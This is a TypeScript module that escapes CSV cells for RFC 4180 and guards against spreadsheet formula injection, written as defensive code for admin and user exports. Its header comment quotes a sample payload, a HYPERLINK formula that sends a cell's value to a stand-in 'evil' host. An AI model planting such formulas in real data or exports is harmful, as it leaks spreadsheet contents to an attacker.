/**
 * Shared CSV escaping (CF-26 / X-PRIV-11; originally A2-1602 for the
 * admin exporters).
 *
 * Wire conventions — column naming, minor-unit scale, truncation
 * marker — are documented in `docs/admin-csv-conventions.md`
 * (A2-1523). Reviewers push back on exports that emit floats or skip
 * the `_minor` / `_stroops` suffix.
 *
 * Two concerns: RFC 4180 special characters (comma, quote, newline)
 * and spreadsheet formula injection (leading `=`, `+`, `-`, `@`, or
 * tab/cr).
 *
 * - RFC 4180: wrap in double quotes, double any embedded quote.
 * - Formula injection: prefix dangerous leading characters with a
 *   single-quote. Excel / Sheets / LibreOffice all strip the `'`
 *   visually but refuse to evaluate what follows as a formula. This
 *   is the OWASP-recommended defense; wrapping in quotes alone is
 *   NOT enough because Excel evaluates `"=..."` when the cell is
 *   pasted unquoted.
 *
 * Shared because the admin exporters previously each declared a
 * narrower copy that handled RFC 4180 only — a compromised actor
 * setting `email = "=HYPERLINK(\"http://evil/\"&A1)"` could land
 * malicious payloads in every exported report. The 18 admin CSV
 * exporters route through here (re-exported from `admin/csv-escape.ts`
 * for call-site stability); the user-side cashback-history CSV and the
 * quarterly-tax operator script were the two outliers that defined a
 * narrower RFC-4180-only escaper (X-PRIV-11) — they now import from
 * here too. This module is the single source of truth; drift-prevention
 * for when finance / legal / an accountant opens a CSV in an
 * elevated-privilege spreadsheet context.
 */

const FORMULA_PREFIXES = new Set(['=', '+', '-', '@', '\t', '\r']);

export function csvEscape(value: string | null | undefined): string {
  if (value === null || value === undefined) return '';
  let v = value;
  // Formula-injection guard — prepend `'` if the first char looks
  // like a spreadsheet formula or control. The leading quote is a
  // spreadsheet convention for "treat as text"; it renders invisibly
  // in Excel / Sheets / LibreOffice.
  if (v.length > 0 && FORMULA_PREFIXES.has(v[0]!)) {
    v = `'${v}`;
  }
  // RFC 4180: wrap in double quotes + double-up embedded quotes if
  // the cell contains a comma, quote, newline, or carriage return.
  if (/[",\r\n]/.test(v)) {
    return `"${v.replace(/"/g, '""')}"`;
  }
  return v;
}

/**
 * Joins a row of already-cell-normalised values into a CSV row.
 * Every exporter has its own `csvRow` that typically coerces
 * `Date`/`bigint`/`number` to string before escaping — that's
 * deliberately left to the caller so per-exporter formatting (ISO
 * timestamps, stroop precision, currency symbols) stays local.
 * This helper only handles the final string-or-null escape.
 */
export function csvRow(fields: readonly (string | null | undefined)[]): string {
  return fields.map(csvEscape).join(',');
}
